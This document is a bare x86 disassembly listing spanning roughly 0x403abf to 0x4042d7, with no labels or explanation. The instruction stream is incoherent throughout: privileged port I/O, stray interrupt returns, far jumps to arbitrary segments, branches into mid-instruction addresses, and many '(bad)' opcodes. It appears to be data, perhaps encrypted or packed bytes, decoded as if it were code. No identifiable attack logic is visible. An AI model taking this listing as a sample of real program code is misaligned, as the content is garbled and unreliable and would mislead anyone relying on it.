  403abf:	call   0xab253bc2
  403ac4:	test   BYTE PTR fs:[eax+0x4b],bh
  403ac8:	inc    ebx
  403ac9:	fldenv [edx-0x36]
  403acc:	mov    cl,0x36
  403ace:	pop    esp
  403acf:	cs test al,0x94
  403ad2:	push   es
  403ad3:	push   0xffd63ae4
  403ad8:	mov    ecx,ebp
  403ada:	cmp    DWORD PTR [esi],ebx
  403adc:	cmc    
  403add:	mov    ebp,0xcdddfe2c
  403ae2:	ja     0x403b1f
  403ae4:	cmp    DWORD PTR ds:0x9c94b1fd,esi
  403aea:	or     edi,esp
  403aec:	mov    edi,0xf11438e
  403af1:	jp     0x403a89
  403af3:	cmp    al,0x6b
  403af5:	scas   eax,DWORD PTR es:[edi]
  403af6:	aas    
  403af7:	rcr    BYTE PTR [ecx+0x7f],0x35
  403afb:	mov    WORD PTR [esi+edi*4-0x22],cs
  403aff:	mov    ecx,0x28fa55f8
  403b04:	and    edx,DWORD PTR [eax+0x3]
  403b07:	fsubr  DWORD PTR [edx-0x4045bd8f]
  403b0d:	inc    ebx
  403b0e:	sahf   
  403b0f:	test   dl,dh
  403b11:	push   eax
  403b12:	sub    ecx,DWORD PTR [ecx]
  403b14:	pop    ecx
  403b15:	out    dx,eax
  403b16:	xchg   BYTE PTR [edx],al
  403b18:	dec    eax
  403b19:	adc    eax,0xe5f3a8ad
  403b1e:	push   ebp
  403b1f:	in     eax,0x81
  403b21:	das    
  403b22:	ja     0x403ac9
  403b24:	fsubr  QWORD PTR [eax+0x7c]
  403b27:	pop    ebp
  403b28:	inc    esp
  403b29:	jmp    0x518f0cd0
  403b2e:	add    al,0xe0
  403b30:	ror    edx,0xb8
  403b33:	inc    ecx
  403b34:	loope  0x403aec
  403b36:	mov    ah,0x8d
  403b38:	or     dl,bh
  403b3a:	shr    eax,0xc3
  403b3d:	gs dec ebp
  403b3f:	or     al,0x9b
  403b41:	out    dx,eax
  403b42:	mov    edi,0x5b0036eb
  403b47:	div    DWORD PTR [ebx+edx*1]
  403b4a:	stc    
  403b4b:	and    esi,ebp
  403b4d:	iret   
  403b4e:	sbb    ecx,edx
  403b50:	and    eax,0xc718ac8
  403b55:	sub    esp,edx
  403b57:	pop    es
  403b58:	imul   esi,edx,0x40c1577c
  403b5e:	imul   ebx
  403b60:	jb     0x403bdc
  403b62:	xchg   esi,eax
  403b63:	jno    0x403bb0
  403b65:	pop    edx
  403b66:	fdiv   DWORD PTR [edx+0x783cb6f6]
  403b6c:	jl     0x403b24
  403b6e:	mov    bl,0x7c
  403b70:	lea    eax,[esi]
  403b72:	cmp    al,0x21
  403b74:	out    dx,eax
  403b75:	sbb    al,0xf7
  403b77:	aam    0xfc
  403b79:	xchg   esi,eax
  403b7a:	nop
  403b7b:	loop   0x403b5c
  403b7d:	sub    al,0xc0
  403b7f:	dec    eax
  403b80:	inc    ecx
  403b81:	sti    
  403b82:	cs aad 0xe6
  403b85:	fdiv   QWORD PTR [edi+0x43]
  403b88:	imul   DWORD PTR [edi-0x13e41270]
  403b8e:	mov    esi,0x2a723774
  403b93:	leave  
  403b94:	xchg   esp,eax
  403b95:	pop    ss
  403b96:	fsubr  DWORD PTR [ecx+0x2b]
  403b99:	xchg   ebx,eax
  403b9a:	out    0x33,al
  403b9c:	pushf  
  403b9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b9e:	push   ebp
  403b9f:	push   ss
  403ba0:	and    DWORD PTR [esi+0x4f],edi
  403ba3:	stc    
  403ba4:	mov    ds:0x12374c96,al
  403ba9:	inc    esi
  403baa:	dec    esi
  403bab:	jno    0x403b7a
  403bad:	mov    al,0x21
  403baf:	cdq    
  403bb0:	pushf  
  403bb1:	fild   DWORD PTR [esi+0x7d1d8a6c]
  403bb7:	hlt    
  403bb8:	push   esp
  403bb9:	or     edx,DWORD PTR [esi+0x1f]
  403bbc:	and    eax,DWORD PTR ds:[edx-0x30]
  403bc0:	ss cmp cl,cl
  403bc3:	ffree  st(7)
  403bc5:	xacquire xchg BYTE PTR [edi+eiz*8],cl
  403bc9:	test   eax,0x85118e9b
  403bce:	cmp    al,0xb6
  403bd0:	add    BYTE PTR [ecx+0x3b],ah
  403bd3:	das    
  403bd4:	dec    edx
  403bd5:	mov    edi,0x119121ce
  403bda:	jmp    0xf37fab3f
  403bdf:	adc    bh,bh
  403be1:	loope  0x403bfa
  403be3:	imul   ebx,DWORD PTR [eax],0x412ab95e
  403be9:	cmp    BYTE PTR [edx-0x2f6098fb],bh
  403bef:	repz iret 
  403bf1:	mov    esp,0x4d80ada8
  403bf6:	loop   0x403bbe
  403bf8:	mov    ch,0x7
  403bfa:	fld    TBYTE PTR [ebx+0x1f70fe07]
  403c00:	push   ss
  403c01:	repz mov al,0xc0
  403c04:	cli    
  403c05:	mov    ebp,0xd85ce981
  403c0a:	mov    ebx,0xd42221fa
  403c0f:	scas   al,BYTE PTR es:[edi]
  403c10:	mov    ebx,0xe81d0bce
  403c15:	push   es
  403c16:	or     edx,ebp
  403c18:	aad    0x97
  403c1a:	jp     0x403c40
  403c1c:	inc    ecx
  403c1d:	mov    ds:0xaed5444f,al
  403c22:	jecxz  0x403c57
  403c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c25:	pop    ebp
  403c26:	fldenv [esi]
  403c28:	das    
  403c29:	or     al,0x84
  403c2b:	out    dx,eax
  403c2c:	adc    ebx,esi
  403c2e:	sbb    edx,DWORD PTR [edx-0x5bb0ef57]
  403c34:	mov    eax,0xd2b46b82
  403c39:	stc    
  403c3a:	jmp    0x403c5f
  403c3c:	mov    al,0x59
  403c3e:	adc    eax,0x64cf3675
  403c43:	push   ebx
  403c44:	leave  
  403c45:	test   eax,0x63d16b86
  403c4a:	mul    bl
  403c4c:	xchg   esp,eax
  403c4d:	pop    ebx
  403c4e:	sbb    BYTE PTR ds:0x13124265,bh
  403c54:	cmp    edi,edx
  403c56:	xchg   ebp,eax
  403c57:	xchg   ecx,eax
  403c58:	mov    fs,ebx
  403c5a:	popf   
  403c5b:	sar    ecx,1
  403c5d:	jle    0x403c7a
  403c5f:	dec    esp
  403c60:	pop    ss
  403c61:	test   BYTE PTR [eax-0x7b],al
  403c64:	js     0x403bf1
  403c66:	inc    eax
  403c67:	sub    esi,eax
  403c69:	push   ecx
  403c6a:	les    ebp,FWORD PTR [eax+ecx*2]
  403c6d:	jno    0x403bfd
  403c6f:	mov    edi,0x291e1ae4
  403c74:	xor    BYTE PTR [edi-0x43],dl
  403c77:	xor    BYTE PTR [eax],al
  403c79:	not    eax
  403c7b:	jl     0x403c93
  403c7d:	pop    eax
  403c7e:	push   ss
  403c7f:	leave  
  403c80:	fidivr WORD PTR [esi-0x57]
  403c83:	repz inc esi
  403c85:	cmp    al,0x23
  403c87:	popa   
  403c88:	neg    dl
  403c8a:	ss cdq 
  403c8c:	mov    eax,ds:0x2c4484fc
  403c91:	pop    ss
  403c92:	iret   
  403c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c94:	xor    ebp,DWORD PTR [esi-0xb063216]
  403c9a:	inc    ecx
  403c9b:	and    dl,BYTE PTR [edi+0x42a597a3]
  403ca1:	sbb    ebp,DWORD PTR [edx-0x99bde75]
  403ca7:	popa   
  403ca8:	push   edi
  403ca9:	add    BYTE PTR [edi+ebp*4+0x23],ch
  403cad:	xor    BYTE PTR [ebx+0x12eac3dc],dh
  403cb3:	pop    ebx
  403cb4:	imul   edi,DWORD PTR [esp+eiz*2-0x4e1087e3],0x59
  403cbc:	xchg   esi,eax
  403cbd:	pop    esp
  403cbe:	mov    bh,0x8
  403cc0:	aas    
  403cc1:	and    al,0x44
  403cc3:	inc    edx
  403cc4:	and    DWORD PTR [eax],eax
  403cc6:	retf   0x5ad6
  403cc9:	dec    eax
  403cca:	retf   0x1f66
  403ccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cce:	sub    eax,0x4dfa04df
  403cd3:	ror    dl,0xdc
  403cd6:	adc    eax,0xb08121d7
  403cdb:	add    al,0x6e
  403cdd:	push   ds
  403cde:	in     eax,dx
  403cdf:	inc    esp
  403ce0:	mov    eax,0x2f4bf0ff
  403ce5:	cmp    al,0x79
  403ce7:	inc    esi
  403ce8:	pop    eax
  403ce9:	and    ebp,edx
  403ceb:	test   eax,0x370e95a5
  403cf0:	imul   ecx,DWORD PTR [ebp-0x53],0xffffffff
  403cf4:	test   BYTE PTR [edi-0x76],al
  403cf7:	pusha  
  403cf8:	mov    esp,0x59bf9976
  403cfd:	cwde   
  403cfe:	into   
  403cff:	loop   0x403d1c
  403d01:	mov    eax,0x7b5f7b01
  403d06:	or     ebx,DWORD PTR [esi+0x1544a6bd]
  403d0c:	popf   
  403d0d:	cli    
  403d0e:	mov    bl,0xfe
  403d10:	add    al,0x52
  403d12:	jecxz  0x403cf6
  403d14:	cmp    ah,dh
  403d16:	pop    ds
  403d17:	call   0xdf2f83b
  403d1c:	daa    
  403d1d:	xchg   ecx,eax
  403d1e:	hlt    
  403d1f:	ins    DWORD PTR es:[edi],dx
  403d20:	xor    bh,dh
  403d22:	jg     0x403cc7
  403d24:	rcl    BYTE PTR [edx-0x10323389],1
  403d2a:	bound  esp,QWORD PTR [edi-0x202ad80]
  403d30:	cli    
  403d31:	pop    eax
  403d32:	push   ds
  403d33:	div    BYTE PTR [ebp+0x54]
  403d36:	div    DWORD PTR [eax]
  403d38:	mov    BYTE PTR [ecx],0xa8
  403d3b:	pop    ebx
  403d3c:	adc    DWORD PTR [ebx-0xe],ecx
  403d3f:	cmp    al,0x2e
  403d41:	pusha  
  403d42:	pop    ds
  403d43:	cmp    ecx,esp
  403d45:	fistp  DWORD PTR [ebp+0x1a3e4b63]
  403d4b:	mov    ecx,0x24df614f
  403d50:	outs   dx,BYTE PTR ds:[esi]
  403d51:	adc    BYTE PTR [esp+ecx*4],dh
  403d54:	mov    dl,0x3b
  403d56:	push   esi
  403d57:	jg     0x403d15
  403d59:	mov    DWORD PTR [ebx-0x5402bd00],edi
  403d5f:	mov    eax,ecx
  403d61:	jmp    0xa1cd:0x872cbafe
  403d68:	mov    esi,0x2532f12b
  403d6d:	ds addr16 iret 
  403d70:	push   ds
  403d71:	das    
  403d72:	push   ebx
  403d73:	stos   DWORD PTR es:[edi],eax
  403d74:	aam    0x29
  403d76:	jne    0x403d12
  403d78:	mov    eax,0xc1dd2e98
  403d7d:	push   ds
  403d7e:	fsubr  DWORD PTR [esi]
  403d80:	cmc    
  403d81:	push   es
  403d82:	out    dx,al
  403d83:	pop    ss
  403d84:	imul   edi,ebp,0x866ad335
  403d8a:	sub    DWORD PTR [esi-0x4402a7ec],ebx
  403d90:	xchg   BYTE PTR [eax],dl
  403d92:	mov    esp,0x2a377b1c
  403d97:	cmp    cl,BYTE PTR [ecx+0x35]
  403d9a:	fsubr  st(5),st
  403d9c:	ins    BYTE PTR es:[edi],dx
  403d9d:	push   ss
  403d9e:	test   eax,0xfc9f9f16
  403da3:	call   0x4f9f:0x2c89d46c
  403daa:	mov    WORD PTR [edx],cs
  403dac:	and    al,0xa3
  403dae:	lea    esi,[edi-0x25]
  403db1:	mov    ah,0xd2
  403db3:	jg     0x403d38
  403db5:	and    esp,DWORD PTR [ebp-0x677e4a4e]
  403dbb:	clc    
  403dbc:	adc    eax,0x3849dcd
  403dc1:	aam    0x40
  403dc3:	pushf  
  403dc4:	mov    dh,0x25
  403dc6:	out    dx,eax
  403dc7:	mov    ds:0x4fc40ce5,al
  403dcc:	xor    dh,al
  403dce:	(bad)  
  403dcf:	hlt    
  403dd0:	push   edx
  403dd1:	pop    ebx
  403dd2:	and    DWORD PTR [edx+0x59],0x28
  403dd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dd7:	jns    0x403e31
  403dd9:	test   DWORD PTR [edx-0x4778094],0xc852b588
  403de3:	int3   
  403de4:	int3   
  403de5:	push   ebp
  403de6:	dec    edi
  403de7:	pop    esi
  403de8:	add    cl,BYTE PTR [esi-0x64522f66]
  403dee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403def:	push   ecx
  403df0:	dec    ebx
  403df1:	rcr    DWORD PTR [ecx-0x1e],1
  403df4:	jno    0x403e07
  403df6:	mov    ah,BYTE PTR [ebp-0x26]
  403df9:	vpxor  ymm7,ymm5,YMMWORD PTR [edx+0xa]
  403dfe:	cmp    eax,DWORD PTR [esi]
  403e00:	add    al,0x89
  403e02:	pop    esi
  403e03:	fcom   DWORD PTR [ebp-0x728acc6d]
  403e09:	xchg   edi,eax
  403e0a:	mov    eax,0x4fda36d1
  403e0f:	fadd   QWORD PTR [eax-0x1ccd1f35]
  403e15:	jecxz  0x403e51
  403e17:	lods   eax,DWORD PTR ds:[esi]
  403e18:	push   ecx
  403e19:	dec    edi
  403e1a:	jge    0x403d9d
  403e1c:	or     al,0x6c
  403e1e:	jnp    0x403e95
  403e20:	sbb    al,0xcf
  403e22:	push   ebx
  403e23:	mov    ds:0x56d980b5,eax
  403e28:	lea    edx,[edi+0x62]
  403e2b:	aad    0xec
  403e2d:	jo     0x403e1b
  403e2f:	leave  
  403e30:	pop    es
  403e31:	imul   ebp,DWORD PTR [ebp+0x59],0xffffffc1
  403e35:	pop    ds
  403e36:	enter  0xdd69,0x26
  403e3a:	xor    DWORD PTR [esi+0x1c],0xbcc197a3
  403e41:	mov    WORD PTR [ecx+eax*4-0x2e247f32],ds
  403e48:	cdq    
  403e49:	in     eax,0x6
  403e4b:	xchg   esp,eax
  403e4c:	add    eax,0x41d013c3
  403e51:	jge    0x403dda
  403e53:	add    esi,DWORD PTR [edi]
  403e55:	jno    0x403e53
  403e57:	dec    ebp
  403e58:	fwait
  403e59:	sti    
  403e5a:	stc    
  403e5b:	or     DWORD PTR [ebx-0x202c19f2],0x21990471
  403e65:	pop    es
  403e66:	out    dx,al
  403e67:	ret    
  403e68:	mov    fs,WORD PTR [ebx]
  403e6a:	cdq    
  403e6b:	push   ds
  403e6c:	xchg   ebx,eax
  403e6d:	cld    
  403e6e:	dec    ecx
  403e6f:	aad    0x9e
  403e71:	lods   eax,DWORD PTR ds:[esi]
  403e72:	jno    0x403e3c
  403e74:	xor    dl,BYTE PTR [eax+0x438ffb4d]
  403e7a:	mov    cl,0x27
  403e7c:	jmp    0x6e31:0xfbe2acab
  403e83:	inc    eax
  403e84:	xchg   DWORD PTR [edx],edx
  403e86:	pop    es
  403e87:	dec    esp
  403e88:	mov    eax,ds:0x70d63763
  403e8d:	(bad)  
  403e8e:	jmp    0x4e7186e1
  403e93:	test   BYTE PTR [eax+ecx*4-0x6c],dh
  403e97:	mov    bh,0x90
  403e99:	lock pop ds
  403e9b:	mov    cl,0xa7
  403e9d:	sbb    BYTE PTR [eax+0x2fe6ef7d],cl
  403ea3:	pop    ecx
  403ea4:	inc    eax
  403ea5:	sub    al,0x55
  403ea7:	push   esp
  403ea8:	push   esi
  403ea9:	add    eax,0x37f8bf16
  403eae:	add    BYTE PTR [ecx+0x50],dh
  403eb1:	out    0x3e,eax
  403eb3:	sti    
  403eb4:	jno    0x403f29
  403eb6:	and    ebx,edi
  403eb8:	mov    BYTE PTR [ebp-0x69],al
  403ebb:	shl    BYTE PTR [eax],cl
  403ebd:	in     eax,dx
  403ebe:	data16 sbb BYTE PTR [edx+0x39],dl
  403ec2:	jg     0x403ee5
  403ec4:	jl     0x403e65
  403ec6:	shl    BYTE PTR [edi],1
  403ec8:	test   al,0x9e
  403eca:	not    BYTE PTR [esi-0x75ea5a62]
  403ed0:	or     DWORD PTR [edi+0x1c979be1],ecx
  403ed6:	mov    bh,0xff
  403ed8:	mov    ds:0xdb1f1762,eax
  403edd:	mov    ss:0x237bd483,al
  403ee3:	jecxz  0x403f49
  403ee5:	pop    edi
  403ee6:	scas   eax,DWORD PTR es:[edi]
  403ee7:	lds    edi,FWORD PTR [eax+0x3b]
  403eea:	mov    ebx,0xe37d6f11
  403eef:	loopne 0x403f24
  403ef1:	dec    esi
  403ef2:	fnsave [eax-0x4a5a06de]
  403ef8:	(bad)  
  403ef9:	into   
  403efa:	cmp    al,0xdc
  403efc:	out    dx,eax
  403efd:	je     0x403f61
  403eff:	xor    eax,0x1353608a
  403f04:	pop    esp
  403f05:	test   eax,0x8b0d54a3
  403f0a:	scas   al,BYTE PTR es:[edi]
  403f0b:	ss inc edi
  403f0d:	add    ch,BYTE PTR [esi]
  403f0f:	pushf  
  403f10:	xchg   edx,eax
  403f11:	call   0x9d290fad
  403f16:	xchg   esi,ebp
  403f18:	jmp    0x403f02
  403f1a:	daa    
  403f1b:	xor    edx,DWORD PTR [edi]
  403f1d:	mov    esp,0xb55f3eb3
  403f22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f23:	cmp    edi,edx
  403f25:	nop
  403f26:	xchg   esp,eax
  403f27:	les    ecx,FWORD PTR [ebx+0x4a]
  403f2a:	jnp    0x403eec
  403f2c:	push   0x2c
  403f2e:	ret    
  403f2f:	fcomip st,st(5)
  403f31:	popf   
  403f32:	mov    ch,0xa7
  403f34:	enter  0x7d84,0x86
  403f38:	test   eax,0xc00e04c9
  403f3d:	and    al,0x9d
  403f3f:	test   eax,0xcd0a99c9
  403f44:	push   es
  403f45:	jns    0x403f3f
  403f47:	gs mov cl,0x80
  403f4a:	(bad)  
  403f4b:	loop   0x403fb5
  403f4d:	jl     0x403f75
  403f4f:	sub    bl,BYTE PTR [edi]
  403f51:	pop    ecx
  403f52:	add    edi,DWORD PTR [edx]
  403f54:	je     0x403ef1
  403f56:	out    0xc4,eax
  403f58:	fs js  0x403f02
  403f5b:	mov    eax,esi
  403f5d:	and    edi,ecx
  403f5f:	test   eax,0xd96a7996
  403f64:	pop    eax
  403f65:	bound  edi,QWORD PTR [esi+0x17]
  403f68:	les    ebx,FWORD PTR [esp+esi*8+0x62d439a8]
  403f6f:	or     eax,0x56a4c649
  403f74:	mov    BYTE PTR [eax+0x18b80f4c],ch
  403f7a:	sbb    ebx,DWORD PTR [eax+0x2a9be28b]
  403f80:	fwait
  403f81:	iret   
  403f82:	or     eax,DWORD PTR [ecx]
  403f84:	jg     0x403f31
  403f86:	push   0xfffffffe
  403f88:	adc    esi,ecx
  403f8a:	lods   eax,DWORD PTR ds:[esi]
  403f8b:	jmp    0x977f:0x99cbfb4
  403f92:	and    edx,0xb127948d
  403f98:	add    eax,0xf15d79db
  403f9d:	pop    ds
  403f9e:	add    ebx,DWORD PTR [edi+edx*4+0x6095cb0e]
  403fa5:	(bad)  [eax+0x761def13]
  403fab:	retf   0xc97f
  403fae:	out    dx,al
  403faf:	ja     0x403fef
  403fb1:	leave  
  403fb2:	cmp    DWORD PTR [esi+0x1],esi
  403fb5:	dec    eax
  403fb6:	push   esi
  403fb7:	dec    esi
  403fb8:	es addr16 push esp
  403fbb:	cmp    BYTE PTR [edi+0x1234e666],0x9a
  403fc2:	mov    DWORD PTR ds:0xfebd50d5,eax
  403fc8:	dec    esi
  403fc9:	sub    BYTE PTR [ebp-0x204b78a8],dh
  403fcf:	pop    esi
  403fd0:	call   0x6911f9
  403fd5:	scas   eax,DWORD PTR es:[edi]
  403fd6:	xchg   BYTE PTR [ecx-0x320937bb],ch
  403fdc:	add    bl,BYTE PTR [edi+0x5f]
  403fdf:	xchg   esp,eax
  403fe0:	mov    esp,0xd089da29
  403fe5:	addr16 push esp
  403fe7:	sbb    bl,BYTE PTR [esp+edx*8-0x44ac5c0]
  403fee:	cmp    al,BYTE PTR [edx+0x4a]
  403ff1:	sbb    cl,BYTE PTR [edx]
  403ff3:	push   es
  403ff4:	mov    ds:0x1242787,al
  403ff9:	add    al,0x1b
  403ffb:	mov    edi,esp
  403ffd:	ds sub eax,0x8dd6626e
  404003:	aaa    
  404004:	inc    ebp
  404005:	popa   
  404006:	cs adc bl,cl
  404009:	or     dl,BYTE PTR [ebp-0x5dd62c32]
  40400f:	jbe    0x403ff3
  404011:	mov    es,esi
  404013:	mov    bh,0xf2
  404015:	push   ds
  404016:	(bad)  
  404017:	jnp    0x404082
  404019:	call   0xf9fc:0x1fdd84e9
  404020:	jge    0x403fd4
  404022:	push   eax
  404023:	call   0x6845a6c5
  404028:	outs   dx,DWORD PTR ds:[esi]
  404029:	cs xchg edi,eax
  40402b:	rcr    DWORD PTR [ecx+0x36],cl
  40402e:	loopne 0x403ff8
  404030:	or     ch,0x7a
  404033:	xchg   ecx,eax
  404034:	push   0xd58529ea
  404039:	(bad)  
  40403a:	aad    0x5c
  40403c:	dec    edx
  40403d:	push   edx
  40403e:	inc    esi
  40403f:	mov    ebx,0xfac3465b
  404044:	hlt    
  404045:	std    
  404046:	loopne 0x404038
  404048:	data16 adc al,0x0
  40404b:	cwde   
  40404c:	jle    0x403fd4
  40404e:	loope  0x404020
  404050:	mov    DWORD PTR [edx-0x6a],ebx
  404053:	in     al,dx
  404054:	jge    0x40406e
  404056:	mov    ds:0x52660c08,al
  40405b:	inc    esi
  40405c:	xor    ebp,DWORD PTR [eax+0x6b]
  40405f:	call   eax
  404061:	pop    ecx
  404062:	ret    0x4106
  404065:	adc    al,cl
  404067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404068:	pop    edx
  404069:	jmp    0xf9559f42
  40406e:	mov    ah,0x23
  404070:	aad    0xdb
  404072:	cmp    al,0xaa
  404074:	sub    eax,0x51feb6
  404079:	ins    BYTE PTR es:[edi],dx
  40407a:	xchg   ebp,eax
  40407b:	mov    ds:0x2e9bf74e,al
  404080:	push   cs
  404081:	prefetch BYTE PTR [esi]
  404084:	les    ecx,FWORD PTR [eax+0x2a168f7a]
  40408a:	(bad)  
  40408b:	in     eax,dx
  40408c:	cdq    
  40408d:	iret   
  40408e:	pop    esp
  40408f:	pusha  
  404090:	call   0x362e:0xb9ba97e
  404097:	xchg   esi,eax
  404098:	addr16 sbb esi,ecx
  40409b:	sbb    BYTE PTR [eax+0x7b],cl
  40409e:	jmp    0x81e3ad80
  4040a3:	xor    eax,0x7c4a4e90
  4040a8:	and    DWORD PTR [ecx+0x2c6287c6],esp
  4040ae:	rol    BYTE PTR [ebp+0x40],cl
  4040b1:	adc    eax,0x94d3f175
  4040b6:	imul   ecx,ecx,0x9a1d53b6
  4040bc:	mov    bh,0xab
  4040be:	push   edi
  4040bf:	retf   0x631a
  4040c2:	xor    al,0x25
  4040c4:	ret    
  4040c5:	sub    esi,DWORD PTR [eax-0xd6b631]
  4040cb:	or     eax,0x23eb5a87
  4040d0:	enter  0xbeee,0x23
  4040d4:	std    
  4040d5:	dec    eax
  4040d6:	retf   
  4040d7:	ja     0x4040be
  4040d9:	push   ss
  4040da:	lahf   
  4040db:	retf   0xb19f
  4040de:	mov    edx,0xe761e3b3
  4040e3:	jae    0x4040e4
  4040e5:	adc    BYTE PTR [ecx],bl
  4040e7:	sti    
  4040e8:	or     DWORD PTR ss:[edx],esp
  4040eb:	in     al,dx
  4040ec:	jbe    0x4040f4
  4040ee:	out    dx,eax
  4040ef:	xchg   DWORD PTR [ebx+eiz*4+0x4299d323],edx
  4040f6:	jp     0x4040ea
  4040f8:	enter  0xce41,0xf
  4040fc:	pushf  
  4040fd:	xchg   ebp,eax
  4040fe:	push   esp
  4040ff:	pop    esi
  404100:	inc    ebp
  404101:	push   edi
  404102:	jmp    0x4040c4
  404104:	je     0x40408a
  404106:	xchg   ebx,eax
  404107:	adc    edx,DWORD PTR ds:0xbda61aa3
  40410d:	jg     0x4040a4
  40410f:	hlt    
  404110:	repz sub al,0x63
  404113:	and    eax,0xff169c95
  404118:	cmp    BYTE PTR [ebx-0x47d5527b],0x3d
  40411f:	inc    ebx
  404120:	jl     0x40413c
  404122:	jmp    0x6ca485eb
  404127:	das    
  404128:	dec    ebx
  404129:	out    0xc6,eax
  40412b:	add    DWORD PTR [edi-0x596473ff],ebp
  404131:	pop    eax
  404132:	pop    esp
  404133:	jns    0x404157
  404135:	cs sub al,0x9e
  404138:	push   edi
  404139:	or     BYTE PTR ds:[ecx-0x78],ch
  40413d:	jg     0x404175
  40413f:	nop
  404140:	mov    ah,0xaa
  404142:	mov    cl,dl
  404144:	test   edi,0xbd634233
  40414a:	add    ch,BYTE PTR ds:[esi]
  40414d:	in     al,0xab
  40414f:	ss inc eax
  404151:	aad    0xf3
  404153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404154:	loopne 0x40415d
  404156:	inc    ebx
  404157:	scas   eax,DWORD PTR es:[edi]
  404158:	sar    ch,cl
  40415a:	xchg   DWORD PTR ds:0x2fd4f12f,ecx
  404160:	ja     0x4041d4
  404162:	or     eax,0x42f1f488
  404167:	jbe    0x40412a
  404169:	scas   eax,DWORD PTR es:[edi]
  40416a:	push   esi
  40416b:	xor    bh,BYTE PTR [eax-0x62]
  40416e:	mov    cl,0xba
  404170:	pop    es
  404171:	push   ds
  404172:	sub    BYTE PTR [edx-0x672e6053],bh
  404178:	sahf   
  404179:	inc    ebx
  40417a:	mov    cl,0xba
  40417c:	pop    edx
  40417d:	(bad)  
  40417e:	mov    edi,0xdb0919df
  404183:	jae    0x404135
  404185:	fcmovnbe st,st(2)
  404187:	push   esi
  404188:	stos   BYTE PTR es:[edi],al
  404189:	mov    edi,ecx
  40418b:	and    ebp,DWORD PTR [edi+0x73674aa0]
  404191:	xchg   edx,eax
  404192:	push   ds
  404193:	call   0xd1152fe8
  404198:	psubsb mm6,QWORD PTR [ebx]
  40419b:	push   edx
  40419c:	push   ecx
  40419d:	push   ss
  40419e:	push   0x99ce396e
  4041a3:	adc    ebp,esp
  4041a5:	imul   edi,ecx,0x77
  4041a8:	in     eax,0xa0
  4041aa:	mov    cl,ah
  4041ac:	cmp    eax,0xd2abd7f3
  4041b1:	add    al,0xb0
  4041b3:	test   al,0x44
  4041b5:	cmp    BYTE PTR [ebx+0x5e8e8034],0xb4
  4041bc:	dec    BYTE PTR [eax+0x713ccd2]
  4041c2:	add    eax,0x13f3f0c5
  4041c7:	std    
  4041c8:	pop    ds
  4041c9:	retf   
  4041ca:	fdivr  QWORD PTR [edx+esi*1]
  4041cd:	jp     0x404153
  4041cf:	hlt    
  4041d0:	mov    ds:0x8ab521ca,al
  4041d5:	add    BYTE PTR [eax+0x42911129],bh
  4041db:	retf   
  4041dc:	aam    0x59
  4041de:	pop    ds
  4041df:	addr16 push cs
  4041e1:	fs xchg ecx,eax
  4041e3:	sbb    dh,0x34
  4041e6:	lock cmp eax,0x8c04e8d8
  4041ec:	jno    0x404219
  4041ee:	xchg   ch,dl
  4041f0:	mov    eax,ds:0x1d30cfb5
  4041f5:	in     al,0x82
  4041f7:	imul   ebx,ebp,0xe363fdf2
  4041fd:	add    ecx,edx
  4041ff:	fidiv  DWORD PTR [esp+ecx*8+0x75]
  404203:	sub    esi,DWORD PTR [edi-0x44]
  404206:	or     esp,DWORD PTR [eax]
  404208:	mov    WORD PTR [ebx+0x5e83d92b],?
  40420e:	sub    bl,BYTE PTR [ebp-0x524258ff]
  404214:	add    al,BYTE PTR [ebp-0x1b93af31]
  40421a:	adc    eax,0x8c000b09
  40421f:	push   ebx
  404220:	dec    ebx
  404221:	jae    0x404207
  404223:	cmp    al,0x28
  404225:	rol    BYTE PTR [esi+edx*4-0xb46e2bf],cl
  40422c:	inc    esp
  40422d:	(bad)  
  40422f:	mov    bh,0xc4
  404231:	and    al,0x48
  404233:	cmp    ecx,ebp
  404235:	jo     0x404252
  404237:	jne    0x40420f
  404239:	gs xchg esp,eax
  40423b:	outs   dx,BYTE PTR ds:[esi]
  40423c:	jae    0x40422e
  40423e:	call   0x177e4ede
  404243:	sbb    esp,0x4c00acfa
  404249:	jne    0x40425d
  40424b:	sub    sp,WORD PTR [esi-0x309c6fc5]
  404252:	je     0x40421c
  404254:	add    al,BYTE PTR [eax+0x30e474de]
  40425a:	in     al,0x29
  40425c:	inc    ebx
  40425d:	repz push esi
  40425f:	sti    
  404260:	adc    al,0x37
  404262:	cmp    al,0xcd
  404264:	pop    ebp
  404265:	sub    ebx,DWORD PTR [ecx-0x3b2b726a]
  40426b:	inc    ecx
  40426c:	adc    dh,BYTE PTR [ebx]
  40426e:	xor    BYTE PTR [ebp-0x31],0x44
  404272:	jle    0x40420c
  404274:	sbb    edi,DWORD PTR [eax+0x4ba372dc]
  40427a:	aad    0xa7
  40427c:	ret    0xb823
  40427f:	fisub  WORD PTR [ebx+eax*8-0x5eb4014a]
  404286:	rcr    DWORD PTR [edx],1
  404288:	mov    al,ah
  40428a:	jns    0x404279
  40428c:	jae    0x4042c7
  40428e:	leave  
  40428f:	out    dx,al
  404290:	lods   al,BYTE PTR ds:[esi]
  404291:	iret   
  404292:	mov    al,ds:0xec2593ce
  404297:	mov    cl,0xbb
  404299:	js     0x40427d
  40429b:	mov    bl,0xa4
  40429d:	repnz adc bh,BYTE PTR [esi-0x4adbe41c]
  4042a4:	outs   dx,BYTE PTR ds:[esi]
  4042a5:	and    DWORD PTR [ecx+eiz*4],0xa92ad2a5
  4042ac:	fwait
  4042ad:	pusha  
  4042ae:	call   0x58b5:0x6b510622
  4042b5:	pop    eax
  4042b6:	or     cl,bl
  4042b8:	outs   dx,BYTE PTR ds:[esi]
  4042b9:	rcr    DWORD PTR [edx+esi*4],1
  4042bc:	jge    0x404270
  4042be:	arpl   WORD PTR [ebx+0x7a],si
  4042c1:	mov    DWORD PTR [ebx-0x64ad2734],0xd50bd205
  4042cb:	ins    BYTE PTR es:[edi],dx
  4042cc:	push   ecx
  4042cd:	ja     0x4042db
  4042cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042d0:	sub    DWORD PTR [ebx-0x72],0xffffff8a
  4042d4:	(bad)  
  4042d5:	xor    al,0xff
  4042d7:	sub    esi,ecx
